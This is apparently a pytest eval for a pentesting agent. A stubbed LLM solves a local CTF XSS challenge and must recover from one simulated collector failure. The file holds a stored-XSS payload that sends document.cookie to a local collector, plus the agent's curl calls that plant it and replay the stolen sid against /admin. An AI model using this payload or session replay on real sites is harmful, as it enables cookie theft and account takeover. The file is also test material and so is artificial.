"""Retry stability eval for easy_login full-chain solve.

Goal:
- Keep the existing easy_login exploit chain intact (`/login -> /visit -> sid -> /admin`).
- Simulate one collector-side receive failure.
- Verify the agent does not stall permanently after that first failure.
- Accept the smallest viable recovery: observe failure, re-trigger `/visit`,
  then continue once the collector receives the sid.

This intentionally does **not** add a generic retry scheduler. It only proves
that one concrete full-chain failure mode can recover with a minimal second
attempt while staying grounded in runtime evidence.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from types import SimpleNamespace

import pytest

import pentestagent.tools.notes as notes_module
from pentestagent.agents.pa_agent.pa_agent import PentestAgentAgent
from pentestagent.tools.notes import get_all_notes_sync, set_notes_file
from pentestagent.tools.registry import get_tool
from pentestagent.workspaces.manager import WorkspaceManager
from tests.integration.easy_login_acceptance import (
    EasyLoginEvidence,
    EasyLoginLevel,
    evaluate_easy_login_run,
)


STOLEN_SID = "flaghunter-admin-sid-retry-42"
FLAG_VALUE = "flag{easy_login_retry_recovered}"
COLLECTOR_PORT = 8765
COLLECTOR_URL = f"http://127.0.0.1:{COLLECTOR_PORT}"
PAYLOAD = (
    f"<script>new Image().src='{COLLECTOR_URL}/?sid='+document.cookie</script>"
)
SID_NOTE_KEY = "easy_login_retry_sid"


class _CommandResult:
    def __init__(self, exit_code: int, stdout: str = "", stderr: str = ""):
        self.exit_code = exit_code
        self.stdout = stdout
        self.stderr = stderr

    @property
    def success(self) -> bool:
        return self.exit_code == 0


class _EasyLoginRetryRuntime:
    def __init__(self):
        self.environment = SimpleNamespace(available_tools=[])
        self.plan = None
        self.target = "http://localhost:3000/"
        self.browser_calls: list[tuple[str, dict]] = []
        self.proxy_calls: list[tuple[str, dict]] = []
        self.command_log: list[str] = []
        self.chain_events: list[str] = []

        self.collector_started = False
        self.payload_submitted = False
        self.visit_attempts = 0
        self.collector_read_attempts = 0
        self.first_receive_failed = False
        self.recovery_action_taken = False

        self.extracted_sid: str | None = None
        self.admin_sid_used: str | None = None
        self.observed_flag: str | None = None
        self.post_flag_tool_calls = 0
        self.collector_log = ""

    async def browser_action(self, action: str, **kwargs):
        self.browser_calls.append((action, dict(kwargs)))

        if action == "navigate":
            requested_url = kwargs.get("url", "")
            return {
                "url": "http://127.0.0.1:3000/",
                "requested_url": requested_url,
                "title": "easy_login Dashboard",
            }

        if action == "get_content":
            return {
                "content": "easy_login Login Portal Playground /login /visit /admin",
                "html": """
                <html>
                  <head>
                    <title>easy_login Dashboard</title>
                    <script src="/app.js"></script>
                  </head>
                  <body>
                    <h1>easy_login</h1>
                    <form id="loginForm" action="/login" method="post">
                      <input id="username" name="username" />
                      <input id="password" name="password" />
                      <textarea id="bio" name="bio"></textarea>
                      <button type="submit">Login</button>
                    </form>
                    <a href="/visit">visit</a>
                    <a href="/admin">admin</a>
                  </body>
                </html>
                """,
            }

        if action == "get_forms":
            return {
                "forms": [
                    {
                        "action": "http://127.0.0.1:3000/login",
                        "method": "post",
                        "inputs": [
                            {"name": "username", "type": "text"},
                            {"name": "password", "type": "password"},
                            {"name": "bio", "type": "textarea"},
                        ],
                    }
                ]
            }

        return {"error": f"unexpected browser action: {action}"}

    async def proxy_action(self, action: str, **kwargs):
        self.proxy_calls.append((action, dict(kwargs)))
        if action == "get" and kwargs.get("url") == "http://127.0.0.1:3000/app.js":
            return {
                "status_code": 200,
                "body": """
                const loginPath = '/login';
                const visitPath = '/visit';
                const adminPath = '/admin';
                async function triggerVisit() { return fetch('/visit', {method:'POST'}); }
                async function loadAdmin() { return fetch('/admin'); }
                """,
            }
        return {"status_code": 404, "body": ""}

    async def execute_command(self, command: str, timeout: int = 300):
        self.command_log.append(command)
        if self.observed_flag:
            self.post_flag_tool_calls += 1

        if command == "curl -s http://127.0.0.1:3000/app.js":
            return _CommandResult(
                0,
                stdout=(
                    "const loginPath='/login'; const visitPath='/visit'; "
                    "const adminPath='/admin'; fetch('/visit',{method:'POST'}); "
                    "fetch('/admin');"
                ),
            )

        if command == f"python -u collector.py --port {COLLECTOR_PORT}":
            self.collector_started = True
            return _CommandResult(
                0,
                stdout=f"collector listening on 127.0.0.1:{COLLECTOR_PORT}",
            )

        if command.startswith("curl -s -X POST http://127.0.0.1:3000/login "):
            assert self.collector_started is True
            assert COLLECTOR_URL in command
            assert "<script>" in command
            self.payload_submitted = True
            self.chain_events.append("/login")
            return _CommandResult(
                0,
                stdout=(
                    "registered ordinary user demo_user via /login and stored profile "
                    "payload for admin bot review"
                ),
            )

        if command == "curl -s -X POST http://127.0.0.1:3000/visit":
            assert self.payload_submitted is True
            self.visit_attempts += 1
            if self.visit_attempts == 1:
                self.chain_events.append("/visit#1")
                return _CommandResult(
                    0,
                    stdout="visit triggered; admin bot opened stored profile",
                )

            self.recovery_action_taken = True
            self.collector_log = (
                f"[collector] GET /?sid={STOLEN_SID} HTTP/1.1 from 127.0.0.1"
            )
            self.chain_events.append("/visit#2")
            return _CommandResult(
                0,
                stdout="visit re-triggered; admin bot revisited stored profile",
            )

        if command == "Get-Content collector.log":
            self.collector_read_attempts += 1
            if self.collector_read_attempts == 1:
                self.first_receive_failed = True
                self.chain_events.append("collector_miss")
                return _CommandResult(
                    1,
                    stderr="collector timeout: first bot visit did not deliver sid",
                )

            assert self.collector_log
            self.extracted_sid = STOLEN_SID
            self.chain_events.append("sid")
            return _CommandResult(0, stdout=self.collector_log)

        if command.startswith("curl -s http://127.0.0.1:3000/admin "):
            assert f'Cookie: sid={STOLEN_SID}' in command
            self.admin_sid_used = STOLEN_SID
            self.observed_flag = FLAG_VALUE
            self.chain_events.append("/admin")
            return _CommandResult(
                0,
                stdout=f"welcome admin\n{FLAG_VALUE}\n",
            )

        return _CommandResult(1, stderr=f"unexpected command: {command}")


def _tool_call(call_id: str, name: str, arguments: dict):
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(
            name=name,
            arguments=json.dumps(arguments, ensure_ascii=False),
        ),
    )


def _tool_messages(messages: list[dict]) -> list[str]:
    return [
        str(m.get("content") or "")
        for m in messages
        if isinstance(m, dict) and m.get("role") == "tool"
    ]


def _extract_sid_from_messages(messages: list[dict]) -> str | None:
    combined = "\n".join(_tool_messages(messages))
    match = re.search(r"sid=([A-Za-z0-9-]+)", combined)
    return match.group(1) if match else None


class _EasyLoginRetrySolveLLM:
    """Deterministic LLM stub that must recover from one collector miss."""

    def __init__(self):
        self.normal_calls = 0
        self.summary_calls = 0
        self.runtime_blocks: list[str] = []
        self.observed_first_failure = False
        self.used_recovery = False

    async def generate(self, system_prompt, messages, tools, task_hint="default", **kwargs):
        if "Provide a brief, clear summary of what was accomplished" in system_prompt:
            self.summary_calls += 1
            return SimpleNamespace(
                content=(
                    "agent 完成 easy_login retry recovery：先观察首页/表单/app.js，"
                    "启动 collector，经 /login 提交 payload，首次 /visit 后 collector 未收到 sid；"
                    "随后最小恢复为再次触发 /visit 并重读 collector，成功提取 "
                    f"sid={STOLEN_SID}，再访问 /admin 拿到 {FLAG_VALUE}。"
                ),
                tool_calls=None,
                usage={"total_tokens": 10},
                finish_reason="stop",
            )

        runtime_block = system_prompt.split("## Runtime Ground Truth", 1)[1]
        self.runtime_blocks.append(runtime_block)

        if self.normal_calls == 0:
            assert "/login" in runtime_block
            assert "/visit" in runtime_block
            assert "/admin" in runtime_block
            assert "/upload" not in runtime_block
            assert "treat those claims as hypotheses" in runtime_block
            assert "Do not assume cross-origin DOM access" in runtime_block

            self.normal_calls += 1
            return SimpleNamespace(
                content="先复核首页、表单和前端 JS，确认 easy_login 的真实利用链。",
                tool_calls=[
                    _tool_call(
                        "browser-content",
                        "browser",
                        {"action": "get_content", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "browser-forms",
                        "browser",
                        {"action": "get_forms", "url": "http://localhost:3000/"},
                    ),
                    _tool_call(
                        "js-read",
                        "terminal",
                        {"command": "curl -s http://127.0.0.1:3000/app.js"},
                    ),
                ],
                usage={"total_tokens": 12},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 1:
            combined = "\n".join(_tool_messages(messages))
            assert "Page content:" in combined
            assert "Form 1:" in combined
            assert "/visit" in combined
            assert "/admin" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="启动本地 collector，准备接收 bot 带出的 sid。",
                tool_calls=[
                    _tool_call(
                        "collector-start",
                        "terminal",
                        {"command": f"python -u collector.py --port {COLLECTOR_PORT}"},
                    )
                ],
                usage={"total_tokens": 8},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 2:
            combined = "\n".join(_tool_messages(messages))
            assert f"collector listening on 127.0.0.1:{COLLECTOR_PORT}" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="通过 /login 提交带外带 sid 的最小 payload。",
                tool_calls=[
                    _tool_call(
                        "login-payload",
                        "terminal",
                        {
                            "command": (
                                "curl -s -X POST http://127.0.0.1:3000/login "
                                f'--data "username=demo_user&password=demo_pass&bio={PAYLOAD}"'
                            )
                        },
                    )
                ],
                usage={"total_tokens": 10},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 3:
            combined = "\n".join(_tool_messages(messages))
            assert "registered ordinary user" in combined
            assert "payload" in combined

            self.normal_calls += 1
            return SimpleNamespace(
                content="第一次触发 /visit 并读取 collector 输出。",
                tool_calls=[
                    _tool_call(
                        "trigger-visit-1",
                        "terminal",
                        {"command": "curl -s -X POST http://127.0.0.1:3000/visit"},
                    ),
                    _tool_call(
                        "read-collector-1",
                        "terminal",
                        {"command": "Get-Content collector.log"},
                    ),
                ],
                usage={"total_tokens": 10},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 4:
            combined = "\n".join(_tool_messages(messages))
            assert "visit triggered" in combined
            assert "Exit Code: 1" in combined
            assert "collector timeout" in combined
            assert STOLEN_SID not in combined
            self.observed_first_failure = True

            self.normal_calls += 1
            self.used_recovery = True
            return SimpleNamespace(
                content="collector 首次未收到 sid，不发散到错误 hint，最小恢复为再次触发 /visit 并重读 collector。",
                tool_calls=[
                    _tool_call(
                        "trigger-visit-2",
                        "terminal",
                        {"command": "curl -s -X POST http://127.0.0.1:3000/visit"},
                    ),
                    _tool_call(
                        "read-collector-2",
                        "terminal",
                        {"command": "Get-Content collector.log"},
                    ),
                ],
                usage={"total_tokens": 12},
                finish_reason="tool_calls",
            )

        if self.normal_calls == 5:
            sid = _extract_sid_from_messages(messages)
            assert sid == STOLEN_SID

            self.normal_calls += 1
            return SimpleNamespace(
                content="恢复成功，记录 sid 并携带 sid 访问 /admin 读取 flag。",
                tool_calls=[
                    _tool_call(
                        "note-sid",
                        "notes",
                        {
                            "action": "create",
                            "key": SID_NOTE_KEY,
                            "value": f"Recovered sid={sid} after retrying /visit once.",
                            "category": "credential",
                            "confidence": "high",
                            "target": "127.0.0.1:3000",
                            "username": "sid",
                            "password": sid,
                            "source": f"collector:{COLLECTOR_PORT}",
                        },
                    ),
                    _tool_call(
                        "admin-with-sid",
                        "terminal",
                        {
                            "command": (
                                "curl -s http://127.0.0.1:3000/admin "
                                f'-H "Cookie: sid={sid}"'
                            )
                        },
                    ),
                    _tool_call(
                        "finish-1",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 1,
                            "result": "Observed homepage, form, and app.js; confirmed /login /visit /admin are the real routes.",
                        },
                    ),
                    _tool_call(
                        "finish-2",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 2,
                            "result": "Submitted the stored XSS payload through /login for the admin-bot flow.",
                        },
                    ),
                    _tool_call(
                        "finish-3",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 3,
                            "result": "Observed the first collector receive failure and recovered by re-triggering /visit once.",
                        },
                    ),
                    _tool_call(
                        "finish-4",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 4,
                            "result": f"Recovered sid={sid} from collector output after the retry and stored it as a credential note.",
                        },
                    ),
                    _tool_call(
                        "finish-5",
                        "finish",
                        {
                            "action": "complete",
                            "step_id": 5,
                            "result": "Used the recovered sid to request /admin and inspect the response for the flag.",
                        },
                    ),
                ],
                usage={"total_tokens": 16},
                finish_reason="tool_calls",
            )

        raise AssertionError("unexpected extra non-summary LLM call")


@pytest.fixture
def isolated_notes(tmp_path: Path):
    notes_file = tmp_path / "notes.json"
    set_notes_file(notes_file)
    notes_module._notes.clear()
    notes_module._loaded_notes_file = None
    yield notes_file
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_easy_login_collector_first_receive_failure_recovers(
    monkeypatch, tmp_path, isolated_notes
):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("CPA_M3_REPORTER", "false")

    async def _noop(*args, **kwargs):
        return None

    monkeypatch.setattr("pentestagent.tools.finish._persist_session_knowledge", _noop)
    monkeypatch.setattr("pentestagent.tools.finish._generate_auto_report", _noop)

    mgr = WorkspaceManager(root=tmp_path)
    mgr.create("easy_login_retry_eval")
    mgr.add_targets("easy_login_retry_eval", ["http://127.0.0.1:3000"])
    mgr.set_active("easy_login_retry_eval")

    import pentestagent.tools.browser  # noqa: F401
    import pentestagent.tools.finish  # noqa: F401
    import pentestagent.tools.notes  # noqa: F401
    import pentestagent.tools.terminal  # noqa: F401

    browser_tool = get_tool("browser")
    terminal_tool = get_tool("terminal")
    notes_tool = get_tool("notes")
    finish_tool = get_tool("finish")
    assert browser_tool is not None
    assert terminal_tool is not None
    assert notes_tool is not None
    assert finish_tool is not None

    runtime = _EasyLoginRetryRuntime()
    llm = _EasyLoginRetrySolveLLM()
    agent = PentestAgentAgent(
        llm=llm,
        tools=[browser_tool, terminal_tool, notes_tool, finish_tool],
        runtime=runtime,
        target="http://localhost:3000/",
        scope=["http://127.0.0.1:3000"],
    )

    task = """[CTF MODE] Target: http://localhost:3000/
Challenge type: xss
Hint: maybe /upload kmz xml2json or cross-origin popup/iframe tricks

OBJECTIVE: Find and capture the flag as fast as possible.
"""

    messages = []
    async for msg in agent.agent_loop(task):
        messages.append(msg)

    assert agent._task_plan.is_complete() is True
    assert llm.summary_calls == 1

    browser_actions = [action for action, _ in runtime.browser_calls]
    assert browser_actions[:3] == ["navigate", "get_content", "get_forms"]
    assert runtime.proxy_calls == [
        ("get", {"url": "http://127.0.0.1:3000/app.js", "timeout": 10})
    ]

    assert runtime.collector_started is True
    assert runtime.payload_submitted is True
    assert runtime.first_receive_failed is True
    assert runtime.recovery_action_taken is True
    assert runtime.visit_attempts == 2
    assert runtime.collector_read_attempts == 2
    assert runtime.extracted_sid == STOLEN_SID
    assert runtime.admin_sid_used == STOLEN_SID
    assert runtime.observed_flag == FLAG_VALUE
    assert runtime.chain_events == ["/login", "/visit#1", "collector_miss", "/visit#2", "sid", "/admin"]
    assert runtime.post_flag_tool_calls == 0

    assert llm.observed_first_failure is True
    assert llm.used_recovery is True

    visit_commands = [cmd for cmd in runtime.command_log if "/visit" in cmd]
    assert len(visit_commands) == 2
    assert any("collector.py" in cmd for cmd in runtime.command_log)
    assert any("/login" in cmd and PAYLOAD in cmd for cmd in runtime.command_log)
    assert any("/admin" in cmd and STOLEN_SID in cmd for cmd in runtime.command_log)
    assert not any("/upload" in cmd for cmd in runtime.command_log)
    assert not any("xml2json" in cmd for cmd in runtime.command_log)
    assert not any("iframe" in cmd for cmd in runtime.command_log)

    notes = get_all_notes_sync()
    assert SID_NOTE_KEY in notes
    sid_note = notes[SID_NOTE_KEY]
    assert sid_note["category"] == "credential"
    assert sid_note["confidence"] == "high"
    assert sid_note["metadata"]["username"] == "sid"
    assert sid_note["metadata"]["password"] == STOLEN_SID
    assert sid_note["metadata"]["target"] == "127.0.0.1:3000"

    runtime_block = llm.runtime_blocks[0]
    assert "/login" in runtime_block
    assert "/visit" in runtime_block
    assert "/admin" in runtime_block
    assert "/upload" not in runtime_block

    completion_msgs = [m for m in messages if m.metadata.get("task_complete")]
    assert completion_msgs, "agent loop should emit a completion summary"
    summary = completion_msgs[-1].content
    assert "首次 /visit 后 collector 未收到 sid" in summary
    assert "再次触发 /visit" in summary
    assert STOLEN_SID in summary
    assert FLAG_VALUE in summary

    assessment = evaluate_easy_login_run(
        EasyLoginEvidence(
            observed_routes=("/login", "/visit", "/admin"),
            payload_submitted=runtime.payload_submitted,
            visit_triggered=runtime.visit_attempts >= 1,
            extracted_sid=runtime.extracted_sid,
            sid_note=sid_note,
            admin_sid_used=runtime.admin_sid_used,
            observed_flag=runtime.observed_flag,
            flag_source="/admin",
            stopped_immediately=True,
            post_flag_tool_calls=runtime.post_flag_tool_calls,
            clean_baseline=True,
            manual_intervention=False,
            successful_clean_runs=1,
        )
    )
    assert assessment.direction_judgement_success is True
    assert assessment.exploit_chain_success is True
    assert assessment.minimum_independent_success is True
    assert assessment.stable_independent_success is False
    assert assessment.highest_level is EasyLoginLevel.EXPLOIT
